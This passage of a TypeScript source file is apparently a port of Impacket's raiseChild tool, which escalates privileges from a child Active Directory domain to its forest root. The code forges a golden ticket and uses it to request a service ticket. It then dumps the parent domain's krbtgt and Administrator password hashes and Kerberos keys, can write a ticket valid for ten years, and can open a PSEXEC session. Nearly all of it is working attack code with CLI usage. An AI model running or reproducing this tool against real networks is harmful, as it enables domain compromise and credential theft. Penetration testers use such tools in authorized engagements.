        [['cifs', serverNameStr], childCreds.domain.toUpperCase()] as unknown as [string[], string],
        null,
        Constants.PrincipalNameType.NT_SRV_INST,
      );

      try {
        logDebug(`Getting TGS for SPN cifs/${serverNameStr}`);
        console.log(`[*] Golden ticket etype: ${goldenCipher.enctype} (using ${attempt.label} child credentials)`);
        console.log(`[*] Requesting TGS for cifs/${serverNameStr}`);

        const tgsResult = await KerberosV5.getKerberosTGS(
          serverName,
          childCreds.domain,
          null,
          goldenTicket,
          goldenCipher,
          goldenSessionKey,
        );

        TGT.cipher = goldenCipher;
        TGT.sessionKey = goldenSessionKey;

        TGS = {
          KDC_REP: tgsResult.tgs,
          cipher: tgsResult.cipher,
          oldSessionKey: tgsResult.oldSessionKey,
          sessionKey: tgsResult.sessionKey,
        };

        succeeded = true;
        break;
      } catch (e: any) {
        if (e instanceof KerberosV5.KerberosError) {
          const code = e.getErrorCode();
          if (code === Constants.ErrorCodes.KDC_ERR_TGT_REVOKED ||
              code === Constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP) {
            warning(`Golden ticket built from ${attempt.label} child credentials rejected (0x${code.toString(16)}), trying next method`);
            continue;
          }
        }
        throw e;
      }
    } catch (e: any) {
      if (e instanceof KerberosV5.KerberosError) {
        const code = e.getErrorCode();
        if (code === Constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP ||
            code === Constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED) {
          warning(`${attempt.label} failed (error 0x${code.toString(16)}), trying next method`);
          continue;
        }
      }
      throw e;
    }
  }

  if (!succeeded || !TGT) {
    throw new Error('Golden ticket was rejected with all available child credential methods');
  }

  // 6) Get parent krbtgt + target user
  info(`Getting credentials for ${parentName}`);
  childCreds.TGT = TGT;
  const [ridParent, credsParent] = await getCredentials('krbtgt', parentName, childCreds, doKerberos);
  console.log(`${parentName}/krbtgt:${ridParent}:${credsParent.lmhash}:${credsParent.nthash}:::`);
  printKerberosKeys(parentName, 'krbtgt', credsParent);

  info(`Target User account name is ${targetName}`);
  const [ridTarget, credsTarget] = await getCredentials(targetName, parentName, childCreds, doKerberos);
  console.log(`${parentName}/${targetName}:${ridTarget}:${credsTarget.lmhash}:${credsTarget.nthash}:::`);
  printKerberosKeys(parentName, targetName, credsTarget);

  // 7) Save golden ticket if requested
  if (writeTGT) {
    info(`Saving golden ticket into ${writeTGT}`);
    const { writeFileSync } = await import('node:fs');
    const ccache = new CCacheModule.CCache();
    ccache.setDefaultHeader();

    const clientPrincipal = new Types.Principal(
      childCreds.username,
      childCreds.domain.toUpperCase(),
      Constants.PrincipalNameType.NT_PRINCIPAL,
    );
    ccache.principal = new CCacheModule.PrincipalCCache();
    ccache.principal.fromPrincipal(clientPrincipal);

    const cred = new CCacheModule.Credential();
    cred.client = new CCacheModule.PrincipalCCache();
    cred.client.fromPrincipal(clientPrincipal);

    const serverPrincipal = new Types.Principal(
      [['krbtgt', childCreds.domain.toUpperCase()], childCreds.domain.toUpperCase()] as unknown as [string[], string],
      null,
      Constants.PrincipalNameType.NT_SRV_INST,
    );
    cred.server = new CCacheModule.PrincipalCCache();
    cred.server.fromPrincipal(serverPrincipal);

    cred.key = new CCacheModule.KeyBlock();
    cred.key.keytype = TGT.sessionKey.enctype;
    cred.key.etype = 0;
    cred.key.keyvalue = TGT.sessionKey.contents;

    const now = Math.floor(Date.now() / 1000);
    const tenYears = now + 365 * 10 * 24 * 60 * 60;
    cred.time = new CCacheModule.Times();
    cred.time.authtime = now;
    cred.time.starttime = now;
    cred.time.endtime = tenYears;
    cred.time.renew_till = tenYears;
    cred.tktflags = 0x50e00000;
    cred.is_skey = 0;

    cred.ticket = new CCacheModule.CountedOctetString();
    cred.ticket.data = TGT.KDC_REP;
    cred.secondTicket = new CCacheModule.CountedOctetString();

    ccache.credentials.push(cred);
    writeFileSync(writeTGT, ccache.getData());
  }

  // 8) PSEXEC if target specified
  if (targetExec) {
    info(`Opening PSEXEC shell at ${targetExec}`);
    const s = new SMBConnection('*SMBSERVER', targetExec);
    const targetAesKey = getPreferredAesKey(credsTarget);
    await s.kerberosLogin(
      targetName, '', parentName,
      credsTarget.lmhash, credsTarget.nthash,
      targetAesKey ?? undefined, undefined, null, null, false,
    );

    console.log('[*] PSEXEC connection established. Use jspacket psexec for full shell.');
    try { await s.logoff(); } catch { /* */ }
  }
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------

console.log(BANNER);

const argv = normalizeArgs(process.argv.slice(2));
let opt: any;
let positionals: string[];
try {
  ({ values: opt, positionals } = parseArgs({
    args: argv,
    allowPositionals: true,
    options: {
      debug: { type: 'boolean', default: false },
      ts: { type: 'boolean', default: false },
      w: { type: 'string' },
      'target-exec': { type: 'string' },
      targetRID: { type: 'string', default: '500' },
      hashes: { type: 'string' },
      'no-pass': { type: 'boolean', default: false },
      k: { type: 'boolean', default: false },
      aesKey: { type: 'string' },
      proxy: { type: 'string' },
      help: { type: 'boolean', short: 'h', default: false },
    },
  }));
} catch (e) {
  console.error(`[-] ${(e as Error).message}`);
  process.exit(1);
}

if (opt.help || positionals.length < 1) {
  console.log(`
Usage: raiseChild domain/username[:password] [options]

Privilege escalation from a child domain up to its forest.

positional arguments:
  target                domain/username[:password]

options:
  -w PATHNAME           Write the golden ticket in CCache format
  -target-exec HOST     Target host for PSEXEC after escalation
  -targetRID RID        Target user RID to dump (default: 500 = Administrator)
  -ts                   Add timestamp to logging
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH   NTLM hashes
  -no-pass                 Don't ask for password
  -k                       Use Kerberos (from ccache / KRB5CCNAME)
  -aesKey HEX              AES key for Kerberos auth

Examples:
  raiseChild childDomain.net/adminuser
  raiseChild -hashes LMHASH:NTHASH childDomain.net/adminuser
  raiseChild -aesKey <hex_aes256_key> childDomain.net/adminuser
  raiseChild -target-exec targetHost childDomain.net/adminuser
  raiseChild -w ccache childDomain.net/adminuser
`);
  process.exit(0);
}

initLogger({ ts: opt.ts, debug: opt.debug });
initProxy(opt.proxy);

const identity = parseIdentity(positionals[0]!, {
  hashes: opt.hashes,
  noPass: opt['no-pass'],
  aesKey: opt.aesKey,
  k: opt.k,
});

if (!identity.domain) {
  critical('Domain should be specified!');
  process.exit(1);
}

const childCreds: Creds = {
  username: identity.username,
  password: identity.password,
  domain: identity.domain,
  lmhash: identity.lmhash ? Buffer.from(identity.lmhash, 'hex') : '',
  nthash: identity.nthash ? Buffer.from(identity.nthash, 'hex') : '',
  aesKey: opt.aesKey ?? '',
  TGT: null,
  TGS: null,
};

let targetExec = opt['target-exec'] ?? null;
if (targetExec) {
  getDNSMachineName(targetExec).then(dns => {
    logDebug(`getDNSMachineName for ${targetExec} returned ${dns}`);
    targetExec = dns;
  }).catch(() => {});
}

(async () => {
  try {
    const [childName, forestName] = await getChildInfo(childCreds, identity.doKerberos);
    info(`Raising child domain ${childName}`);
    info(`Forest FQDN is: ${forestName}`);

    await raiseUp(
      childName, childCreds, forestName,
      opt.targetRID ?? '500', identity.doKerberos,
      opt.w ?? null, targetExec,
    );
  } catch (e: any) {
    if (opt.debug) console.error(e);
    critical(String(e.message ?? e));
    process.exit(1);
  }
})();
